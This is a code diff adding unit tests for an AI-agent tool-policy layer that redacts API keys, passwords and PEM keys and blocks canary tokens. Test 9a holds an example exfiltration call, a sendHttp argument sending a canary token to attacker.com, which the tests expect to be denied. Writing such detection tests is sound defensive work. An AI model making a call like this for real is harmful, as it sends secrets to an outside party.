@@ -169,6 +169,133 @@ export async function runPolicyTests() {
     assert(false, 'Test 6: LoggingPolicy nested object sanitization', err.message);
   }
 
+  // TEST 7: SecretRedactionPolicy String Pattern Redaction
+  try {
+    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
+    const redactionPolicy = new SecretRedactionPolicy();
+
+    const outputWithSecrets =
+      'Found OpenAI key sk-abcdef123456789012345678 and GitHub token ghp_123456789012345678901234567890123456 on server.';
+    const result = await redactionPolicy.evaluateOutput(dummyCtx, 'fetchLog', outputWithSecrets);
+
+    assert(result.decision === 'sanitize', 'Test 7a: Output containing secrets is flagged for sanitization');
+    if (result.decision === 'sanitize') {
+      const sanitized = result.sanitizedResult as string;
+      assert(!sanitized.includes('sk-abcdef'), 'Test 7b: OpenAI secret key is redacted');
+      assert(!sanitized.includes('ghp_123456'), 'Test 7c: GitHub PAT is redacted');
+      assert(sanitized.includes('[REDACTED_SECRET]'), 'Test 7d: Mask placeholder is applied');
+    }
+  } catch (err: any) {
+    assert(false, 'Test 7: SecretRedactionPolicy String Pattern Redaction', err.message);
+  }
+
+  // TEST 8: SecretRedactionPolicy Object Field Masking
+  try {
+    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
+    const redactionPolicy = new SecretRedactionPolicy();
+
+    const userProfile = {
+      username: 'agent_user',
+      apiKey: 'secret_live_api_token_12345',
+      profile: {
+        password: 'my-super-secret-password',
+        email: 'user@example.com',
+      },
+    };
+
+    const result = await redactionPolicy.evaluateOutput(dummyCtx, 'getUser', userProfile);
+    assert(result.decision === 'sanitize', 'Test 8a: Object containing sensitive keys is sanitized');
+    if (result.decision === 'sanitize') {
+      const sanitized = result.sanitizedResult as any;
+      assert(sanitized.username === 'agent_user', 'Test 8b: Non-sensitive username is preserved');
+      assert(sanitized.apiKey === '[REDACTED_SECRET]', 'Test 8c: apiKey field is masked');
+      assert(sanitized.profile.password === '[REDACTED_SECRET]', 'Test 8d: Nested password is masked');
+      assert(sanitized.profile.email === 'user@example.com', 'Test 8e: Non-sensitive email is preserved');
+    }
+  } catch (err: any) {
+    assert(false, 'Test 8: SecretRedactionPolicy Object Field Masking', err.message);
+  }
+
+  // TEST 9: CanaryDetectionPolicy Prompt Exfiltration Interception
+  try {
+    const { CanaryDetectionPolicy } = await import('../src/policies/canary-detection.policy');
+    const canaryPolicy = new CanaryDetectionPolicy({
+      canaryTokens: ['CANARY_SECRET_TOKEN_999'],
+    });
+
+    // 9a: Input args containing canary token
+    const leakedArgs = { url: 'https://attacker.com/leak?token=CANARY_SECRET_TOKEN_999' };
+    const evalInput = await canaryPolicy.evaluate(dummyCtx, 'sendHttp', leakedArgs);
+    assert(evalInput.decision === 'deny', 'Test 9a: Attempt to leak canary token in tool arguments is blocked');
+
+    // 9b: Output containing canary token
+    const leakedOutput = 'Third-party response with CANARY_SECRET_TOKEN_999 in payload';
+    const evalOutput = await canaryPolicy.evaluateOutput(dummyCtx, 'scrapeWeb', leakedOutput);
+    assert(evalOutput.decision === 'deny', 'Test 9b: Tool output reflecting canary token is blocked');
+
+    // 9c: Clean execution without canary
+    const cleanOutput = 'Normal system status: OK';
+    const evalClean = await canaryPolicy.evaluateOutput(dummyCtx, 'getStatus', cleanOutput);
+    assert(evalClean.decision === 'allow', 'Test 9c: Clean output without canary token is allowed');
+  } catch (err: any) {
+    assert(false, 'Test 9: CanaryDetectionPolicy Prompt Exfiltration Interception', err.message);
+  }
+
+  // TEST 10: PEM Private Key Regex Redaction
+  try {
+    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
+    const redactionPolicy = new SecretRedactionPolicy();
+
+    const pemKey = `Config loaded with key:
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA0Y1+abcdef123456789==
+-----END RSA PRIVATE KEY-----
+Connection ready.`;
+
+    const result = await redactionPolicy.evaluateOutput(dummyCtx, 'loadKey', pemKey);
+    assert(result.decision === 'sanitize', 'Test 10a: PEM private key is detected and flagged for sanitization');
+    if (result.decision === 'sanitize') {
+      const sanitized = result.sanitizedResult as string;
+      assert(!sanitized.includes('MIIEowIBAAKCAQEA'), 'Test 10b: Private key body is redacted');
+      assert(sanitized.includes('[REDACTED_SECRET]'), 'Test 10c: Mask placeholder is applied to PEM block');
+    }
+  } catch (err: any) {
+    assert(false, 'Test 10: PEM Private Key Regex Redaction', err.message);
+  }
+
+  // TEST 11: Circular Reference Traversal Protection
+  try {
+    const { SecretRedactionPolicy } = await import('../src/policies/secret-redaction.policy');
+    const { CanaryDetectionPolicy } = await import('../src/policies/canary-detection.policy');
+
+    const redactionPolicy = new SecretRedactionPolicy();
+    const canaryPolicy = new CanaryDetectionPolicy({ canaryTokens: ['TRAP_CANARY_123'] });
+
+    // Construct circular object
+    const circularObj: any = {
+      name: 'node_a',
+      apiKey: 'sk-secret-key-12345678901234567890',
+    };
+    circularObj.self = circularObj;
+
+    // 11a: SecretRedactionPolicy handles circular reference without infinite loop and without leaking original object
+    const redactResult = await redactionPolicy.evaluateOutput(dummyCtx, 'getGraph', circularObj);
+    assert(redactResult.decision === 'sanitize', 'Test 11a: Circular object is processed safely without stack overflow');
+    if (redactResult.decision === 'sanitize') {
+      const sanitized = redactResult.sanitizedResult as any;
+      assert(sanitized.apiKey === '[REDACTED_SECRET]', 'Test 11b: Secret key in circular object is masked');
+      assert(sanitized.self === sanitized, 'Test 11c: Circular reference points strictly to sanitized clone');
+      assert(sanitized.self.apiKey === '[REDACTED_SECRET]', 'Test 11d: Nested circular access is also masked');
+      assert(sanitized !== circularObj, 'Test 11e: Sanitized object does not retain reference to original unredacted object');
+    }
+
+    // 11b: CanaryDetectionPolicy handles circular reference without infinite loop
+    const canaryResult = await canaryPolicy.evaluateOutput(dummyCtx, 'getGraph', circularObj);
+    assert(canaryResult.decision === 'allow', 'Test 11f: Canary detection processes circular object without loop');
+  } catch (err: any) {
+    assert(false, 'Test 11: Circular Reference Traversal Protection', err.message);
+  }
+
   console.log(`\n  📊 Policies Test Results: ${passed} passed, ${failed} failed.\n`);
   if (failed > 0) {
     throw new Error('Policy Unit Tests Failed');
